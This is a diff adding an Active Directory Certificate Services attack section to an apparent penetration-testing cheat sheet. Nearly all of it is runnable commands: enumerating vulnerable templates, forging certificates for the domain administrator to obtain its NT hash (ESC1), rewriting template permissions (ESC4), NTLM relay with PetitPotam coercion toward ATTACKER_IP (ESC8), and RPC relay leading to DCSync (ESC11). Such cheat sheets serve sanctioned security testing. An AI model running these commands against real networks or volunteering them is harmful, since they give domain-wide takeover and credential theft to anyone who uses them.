@@ -342,6 +342,82 @@ crackmapexec smb DC_IP -u USER -p 'PASS' -M gpp_password
 
 ---
 
+## AD Certificate Services (ADCS) Attacks
+
+### Enumeration
+
+```bash
+# Certipy — find vulnerable templates and CAs
+certipy find -u USER@DOMAIN -p 'PASS' -dc-ip DC_IP -vulnerable -stdout
+certipy find -u USER@DOMAIN -p 'PASS' -dc-ip DC_IP -json -output adcs.json
+
+# Certify.exe (Windows)
+.\Certify.exe find /vulnerable
+.\Certify.exe cas
+```
+
+### ESC1 — Misconfigured Template (Client Auth + Supply Subject)
+
+```bash
+# Template allows enrollee to specify SAN (Subject Alternative Name)
+# → request cert as Domain Admin
+certipy req -u USER@DOMAIN -p 'PASS' -ca 'CA-NAME' -template 'VULN-TEMPLATE' \
+  -upn 'administrator@domain.local' -dc-ip DC_IP
+
+# Authenticate with forged cert
+certipy auth -pfx administrator.pfx -dc-ip DC_IP
+# → outputs NT hash for administrator
+```
+
+### ESC4 — Template ACL Abuse
+
+```bash
+# If you have write access to a template → make it vulnerable (ESC1)
+certipy template -u USER@DOMAIN -p 'PASS' -template 'TARGET-TEMPLATE' \
+  -save-old -dc-ip DC_IP
+# Now request as ESC1
+certipy req -u USER@DOMAIN -p 'PASS' -ca 'CA-NAME' -template 'TARGET-TEMPLATE' \
+  -upn 'administrator@domain.local' -dc-ip DC_IP
+# Restore original
+certipy template -u USER@DOMAIN -p 'PASS' -template 'TARGET-TEMPLATE' \
+  -configuration old_config.json -dc-ip DC_IP
+```
+
+### ESC8 — NTLM Relay to ADCS HTTP Enrollment
+
+```bash
+# If CA has HTTP enrollment enabled (http://CA/certsrv/)
+# Relay NTLM auth (from Responder/PetitPotam) to CA web enrollment
+ntlmrelayx.py -t http://CA-IP/certsrv/certfnsh.asp -smb2support \
+  --adcs --template DomainController
+
+# Coerce DC auth via PetitPotam
+python3 PetitPotam.py ATTACKER_IP DC_IP
+
+# Authenticate with captured cert
+certipy auth -pfx dc.pfx -dc-ip DC_IP
+```
+
+### ESC11 — NTLM Relay to ICPR (RPC)
+
+```bash
+# If CA RPC interface lacks encryption flag
+certipy relay -ca CA_IP -template DomainController
+# Coerce with PetitPotam/PrinterBug, get DC cert → DCSync
+```
+
+### Key Finding Severities
+
+| ESC | Impact | Severity |
+|-----|--------|----------|
+| ESC1 | Any user → Domain Admin | Critical |
+| ESC4 | Template write → Domain Admin | Critical |
+| ESC8 | Network position → Domain Admin (via coercion) | High-Critical |
+| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | Critical |
+| ESC7 | CA manager approval bypass | High |
+
+---
+
 ## Windows Privilege Escalation
 
 ### Token Impersonation
